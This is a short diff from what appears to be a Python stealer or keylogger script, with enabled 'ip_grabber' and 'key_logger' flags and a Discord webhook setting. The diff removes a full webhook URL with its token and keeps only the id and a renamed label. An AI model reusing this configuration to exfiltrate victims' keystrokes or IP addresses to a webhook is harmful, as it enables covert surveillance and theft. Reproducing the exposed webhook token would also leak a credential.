@@ -20,7 +20,7 @@ ip_grabber_f = True
 key_logger = True
 today = date.today()
 
-ext = {"webhook-id": "https://discordapp.com/api/webhooks/833422825754460190/De7d5OZoCy0Kupg5cqHn6rqJ7nedLo769IVUrSJz3WE3Tg1ol7uc5rppECslR6ZMlIEk", "webhook-name": "capdin huk"}
+ext = {"webhook-id": "833422825754460190", "webhook-name": "Captain Hook"}
 
 os.system('title EPIC')
 
